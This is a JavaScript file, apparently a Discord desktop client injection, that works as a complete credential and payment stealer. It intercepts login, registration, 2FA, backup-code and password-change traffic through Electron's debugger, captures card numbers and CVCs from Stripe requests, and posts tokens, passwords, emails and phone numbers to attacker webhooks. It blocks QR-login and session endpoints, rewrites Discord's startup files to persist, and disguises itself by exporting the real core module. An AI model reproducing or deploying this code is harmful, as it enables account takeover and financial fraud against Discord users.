const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "%INJECT_WEBHOOK%",
    dualhook: "%INJECT_DUALHOOK%",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        staff: {
            emoji: "<:staff:1362105228719034679>",
            id: 1 << 0,
            rare: true,
        },
        active_developer: {
            emoji: "<:activedev:1362104965065212074>",
            id: 1 << 22,
            rare: false,
        },
        early_supporter: {
            emoji: "<:pig:1362105166811103515>",
            id: 1 << 9,
            rare: true,
        },
        verified_developer: {
            emoji: "<:dev:1362105068060676329>",
            id: 1 << 17,
            rare: true,
        },
        certified_moderator: {
            emoji: "<:mod:1362105108170539229>",
            id: 1 << 18,
            rare: true,
        },
        bug_hunter_level_1: {
            emoji: "<:bughunter1:1362105034157981758>",
            id: 1 << 3,
            rare: true,
        },
        bug_hunter_level_2: {
            emoji: "<:bughunter2:1362105047462314293>",
            id: 1 << 14,
            rare: true,
        },
        partner: {
            emoji: "<:partner:1362105185094336622>",
            id: 1 << 1,
            rare: true,
        },
        hypesquad_house_1: {
            emoji: "<:bravery:1362105004089147784>",
            id: 1 << 6,
            rare: false,
        },
        hypesquad_house_2: {
            emoji: "<:brilliance:1362105019066748968>",
            id: 1 << 7,
            rare: false,
        },
        hypesquad_house_3: {
            emoji: "<:balance:1362104986330202172>",
            id: 1 << 8,
            rare: false,
        },
        legacyusername: {
            emoji: "<:pomelo:1281110330767835188>",
            id: 32,
            rare: false,
        },
        hypesquad: {
            emoji: "<:events:1362105087006212456>",
            id: 1 << 2,
            rare: true,
        },
        nitro: {
            emoji: "<a:nitro:1362115714185691186>",
            rare: false,
        },
        nitro_bronze: {
            emoji: "<:bronze:1365454925357645994>",
            rare: false,
        },
        nitro_silver: {
            emoji: "<:silver:1365454972962996254>",
            rare: false,
        },
        nitro_gold: {
            emoji: "<:gold:1365454994337435739>",
            rare: false,
        },
        nitro_platinum: {
            emoji: "<:platinum:1365455020690243737>",
            rare: false,
        },
        nitro_diamond: {
            emoji: "<:diamond:1365455075937488967>",
            rare: false,
        },
        nitro_emerald: {
            emoji: "<:emerald:1365455096296509524>",
            rare: false,
        },
        nitro_ruby: {
            emoji: "<:ruby:1365455125187137536>",
            rare: false,
        },
        nitro_opal: {
            emoji: "<:opal:1365455150260551740>",
            rare: false,
        },
        guild_booster_lvl1: {
            emoji: "<:boost1:1362104840250986667>",
            rare: false,
        },
        guild_booster_lvl2: {
            emoji: "<:boost2:1362104851575607636>",
            rare: false,
        },
        guild_booster_lvl3: {
            emoji: "<:boost3:1362104863084904830>",
            rare: false,
        },
        guild_booster_lvl4: {
            emoji: "<:boost4:1362104873600024857>",
            rare: true,
        },
        guild_booster_lvl5: {
            emoji: "<:boost5:1362104892226928812>",
            rare: true,
        },
        guild_booster_lvl6: {
            emoji: "<:boost6:1362104904348467431>",
            rare: true,
        },
        guild_booster_lvl7: {
            emoji: "<:boost7:1362104916247707658>",
            rare: true,
        },
        guild_booster_lvl8: {
            emoji: "<:boost8:1362104931745530197>",
            rare: true,
        },
        guild_booster_lvl9: {
            emoji: "<:boost9:1362104950938796164>",
            rare: true,
        },
        quest_completed: {
            emoji: "<:quest:1362105209496801290>",
            rare: false,
        },
    },
};

const executeJS = async (script) => {
    const windows = BrowserWindow.getAllWindows();
    if (windows.length === 0) return null;
    return await windows[0].webContents.executeJavaScript(script, true);
};

const clearAllUserData = async () => {
    await executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    await executeJS("location.reload()");
};

const getToken = async () => {
    const script = `(function() {
        try {
            return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
        } catch (e) {
            try {
                return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getCurrentUser!==void 0).exports.default.getToken();
            } catch (e2) {
                return null;
            }
        }
    })()`;
    return await executeJS(script);
};

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const hooker = async (content, token, account) => {
    content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n` + (content["content"] || "");
    content["username"] = "ümidi injection";
    content["avatar_url"] = "https://cdn.discordapp.com/attachments/1461588188878471304/1465414875013451979/images_3.jpeg?ex=697affb4&is=6979ae34&hm=ed9532cc0ae899dcc8b852cd8ae68913e2eb5f81ee90d796e392ce7da4466338&";

    // Capture existing fields from event (e.g., Passwords, Backup Codes)
    let eventFields = [];
    if (content.embeds && content.embeds[0] && content.embeds[0].fields) {
        eventFields = content.embeds[0].fields;
    }

    // Main Embed
    content["embeds"][0] = {
        title: `${account.username}`,
        color: 0xff0000,
        thumbnail: { url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` },
        footer: { text: "https://t.me/umidivouches" },
        timestamp: new Date().toISOString(),
        fields: eventFields // Start with event-specific fields
    };

    const nitro = getNitro(account.premium_type);
    const badges = await getBadges(account.id, token);
    const billing = await getBilling(token);

    content["embeds"][0]["fields"].push(
        { name: "tokencik", value: `\`\`\`${token}\`\`\``, inline: false },
        { name: "nitro", value: nitro, inline: true },
        { name: "severiz cc", value: billing, inline: true },
        { name: "rozetler?", value: badges, inline: false },
        { name: "outlook.com", value: `\`${account.email}\``, inline: true },
        { name: "her numara var", value: `\`${account.phone || "None"}\``, inline: true },
    );

    await request("POST", CONFIG.webhook, {
        "Content-Type": "application/json"
    }, JSON.stringify(content));

    if (CONFIG.dualhook) {
        await request("POST", CONFIG.dualhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
    }
};



const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});
const fetchBilling = async token => await fetch("/billing/payment-sources", {
    "Authorization": token
});
const fetchServers = async token => await fetch("/guilds?with_counts=true", {
    "Authorization": token
});
const fetchFriends = async token => await fetch("/relationships", {
    "Authorization": token
});

const getNitro = flags => {
    switch (flags) {
        case 1:
            return '`klasik`';
        case 2:
            return '`boost`';
        case 3:
            return '`baysik`';
        default:
            return '`None`';
    }
};

const fetchProfile = async (id, token) => await fetch("users/" + id + "/profile", { "Authorization": token });

const CurrentNitro = (since) => {
    if (!since) return { badge: null };
    const cd = new Date();
    const sd = new Date(since);
    const year = cd.getFullYear() - sd.getFullYear();
    const month = cd.getMonth() - sd.getMonth();
    let passed = year * 12 + month;
    if (cd.getDate() < sd.getDate()) passed -= 1;

    const nitros = [
        { badge: "nitro", lowerLimit: 0, upperLimit: 0 },
        { badge: "nitro_bronze", lowerLimit: 1, upperLimit: 2 },
        { badge: "nitro_silver", lowerLimit: 3, upperLimit: 5 },
        { badge: "nitro_gold", lowerLimit: 6, upperLimit: 11 },
        { badge: "nitro_platinum", lowerLimit: 12, upperLimit: 23 },
        { badge: "nitro_diamond", lowerLimit: 24, upperLimit: 35 },
        { badge: "nitro_emerald", lowerLimit: 36, upperLimit: 59 },
        { badge: "nitro_ruby", lowerLimit: 60, upperLimit: 71 },
        { badge: "nitro_opal", lowerLimit: 72 },
    ];

    const current = nitros.find((badge) => {
        const inll = passed >= badge.lowerLimit;
        const inul = typeof badge.upperLimit === "undefined" || passed <= badge.upperLimit;
        return inll && inul;
    });
    return { badge: current?.badge || null };
};

const getBadges = async (id, token) => {
    try {
        const responseData = await request("GET", `https://discord.com/api/v9/users/${id}/profile`, { "Authorization": token });
        const data = JSON.parse(responseData);

        if (!data || !Array.isArray(data.badges)) return "`No Badges`";

        // Combine profile badges with nitro badge
        const badgeIds = data.badges.map((badge) => badge.id);
        const nitro = CurrentNitro(data.premium_since);

        let finalBadges = "";

        // Add badges from list
        if (badgeIds.length) {
            finalBadges += badgeIds.map((id) => CONFIG.badges[id]?.emoji).filter(Boolean).join(" ");
        }

        // Add nitro badge if exists
        if (nitro.badge && CONFIG.badges[nitro.badge]) {
            finalBadges += (finalBadges ? " " : "") + CONFIG.badges[nitro.badge].emoji;
        }

        return finalBadges || "`No Badges`";
    } catch (e) {
        return "`No Badges`";
    }
};

const getBilling = async token => {
    const data = await fetchBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += '💳';
                    break;
                case 2:
                    billing += '<:paypal:1148653305376034967> ';
                    break;
            }
        }
    });
    return billing || '`❌`';
};

const getFriends = async token => {
    const friends = await fetchFriends(token);

    const filteredFriends = friends.filter((user) => {
        return user.type == 1
    })
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var badges = getRareBadges(acc.user.public_flags)
        if (badges != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**No Rare Friends**";

    return {
        message: rareUsers,
        totalFriends: friends.length,
    };
};

const getServers = async token => {
    const guilds = await fetchServers(token);

    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") {
            rareGuilds += `**Rare Servers:**\n`;
        }
        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }

    rareGuilds = rareGuilds || "**No Rare Servers**";

    return {
        message: rareGuilds,
        totalGuilds: guilds.length,
    };
};

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": "`" + email + "`",
                "inline": true
            }, {
                "name": "Password",
                "value": "`" + password + "`",
                "inline": true
            }]
        }]
    };

    await hooker(content, token, account);
}

const BackupCodesViewed = async (codes, token) => {
    debugLog(`BackupCodesViewed called with ${codes ? codes.length : 'null'} codes`);
    try {
        const account = await fetchAccount(token)

        // Use DOM scraping as primary method like in the old script
        const domCodesScript = `(function() {
            const elements = document.querySelectorAll('span[class^="code_"]');
            let p = [];
            elements.forEach((element) => {
                const code = element.textContent;
                p.push(code);
            });
            return p;
        })()`;

        let allCodes = [];
        try {
            const domCodes = await executeJS(domCodesScript);
            if (domCodes && Array.isArray(domCodes)) {
                allCodes = domCodes;
            }
        } catch (e) { debugLog("DOM scraping error: " + e.message); }

        // Fallback to network intercepted codes if DOM failed or returned empty
        if (allCodes.length === 0 && codes && Array.isArray(codes)) {
            allCodes = codes.filter(c => c.consumed === false).map(c => c.code);
        }

        let message = "";
        for (let code of allCodes) {
            // Check if code matches the pattern (alphanumeric 8 chars usually) or is already formatted
            if (code.length === 8) {
                message += `${code.substr(0, 4)}-${code.substr(4)}\n`;
            } else {
                message += `${code}\n`;
            }
        }
        const content = {
            "content": `${account.username} 2fa kodlarını al `,
            "embeds": [{
                "fields": [{
                    "name": "kodlar",
                    "value": "```" + message + "```",
                    "inline": false
                },
                {
                    "name": "tokencik",
                    "value": "`" + token + "`",
                    "inline": false
                },
                {
                    "name": "posta",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "nokia 3310",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }
                ]

            }]
        };

        await hooker(content, token, account);
    } catch (e) {
        debugLog(`Error in BackupCodesViewed: ${e.message}`);
    }
}

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `${account.username} enayi kaçacağını zannetti`,
        "embeds": [{
            "fields": [{
                "name": "yeni şifre",
                "value": "`" + newPassword + "`",
                "inline": true
            }, {
                "name": "eskiside bu amk",
                "value": "`" + oldPassword + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `${account.username} kartını ekledi`,
        "embeds": [{
            "fields": [{
                "name": "no",
                "value": "`" + number + "`",
                "inline": true
            }, {
                "name": "cvc",
                "value": "`" + cvc + "`",
                "inline": true
            }, {
                "name": "skt",
                "value": "`" + month + "/" + year + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `${account.username} hesapına paypal ekledi`,
        "embeds": [{
            "fields": [{
                "name": "posta",
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": "no",
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));

        const token = await getToken();
        if (!token) return;

        const account = await fetchAccount(token)

        const content = {
            "content": `${account.username} injectledim abi`,

            "embeds": [{
                "fields": [{
                    "name": "posta",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "3310 numarası",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }]
            }]
        };

        await hooker(content, token, account);
        clearAllUserData();
    }

    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(path.join(app, 'modules')).filter(x => /discord_desktop_core-+?/.test(x))[0]
    const indexJs = path.join(app, 'modules', coreVal, 'discord_desktop_core', 'index.js');
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                name: 'discord',
                main: 'index.js',
            },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      // Self-repair/download logic removed for offline use
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let initiationCalled = false;
const debugLog = (msg) => {
    // Logging disabled
};

const createWindow = () => {
    const windows = BrowserWindow.getAllWindows();
    windows.forEach(win => {
        try {
            if (win.webContents.debugger.isAttached()) return;
            win.webContents.debugger.attach('1.3');
            win.webContents.debugger.on('message', async (_, method, params) => {
                if (!initiationCalled) {
                    debugLog("Initiation started");
                    await initiation();
                    initiationCalled = true;
                }

                if (method !== 'Network.responseReceived') return;
                if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
                if (![200, 202].includes(params.response.status)) return;

                try {
                    const responseUnparsedData = await win.webContents.debugger.sendCommand('Network.getResponseBody', {
                        requestId: params.requestId
                    });
                    const responseData = JSON.parse(responseUnparsedData.body);

                    const requestUnparsedData = await win.webContents.debugger.sendCommand('Network.getRequestPostData', {
                        requestId: params.requestId
                    });
                    const requestData = JSON.parse(requestUnparsedData.postData);

                    debugLog(`Intercepted ${params.response.url}`);

                    switch (true) {
                        case params.response.url.endsWith('/login'):
                            if (!responseData.token) {
                                email = requestData.login;
                                password = requestData.password;
                                return;
                            }
                            EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                            break;

                        case params.response.url.endsWith('/register'):
                            EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                            break;

                        case params.response.url.endsWith('/totp'):
                            EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                            break;

                        case params.response.url.endsWith('/codes-verification'):
                            BackupCodesViewed(responseData.backup_codes, await getToken());
                            break;

                        case params.response.url.endsWith('/@me'):
                            if (!requestData.password) return;

                            debugLog("/@me request with password detected");

                            if (requestData.email) {
                                EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                            }

                            if (requestData.new_password) {
                                PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                            }
                            break;
                    }
                } catch (e) {
                    debugLog(`Error processing debugger message: ${e.message}`);
                }
            });

            win.webContents.debugger.sendCommand('Network.enable');
            debugLog("Debugger attached and Network enabled");
        } catch (e) {
            debugLog(`Failed to attach debugger: ${e.message}`);
        }

        win.on('closed', () => {
            setTimeout(createWindow, 1000);
        });
    });
}
createWindow();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");
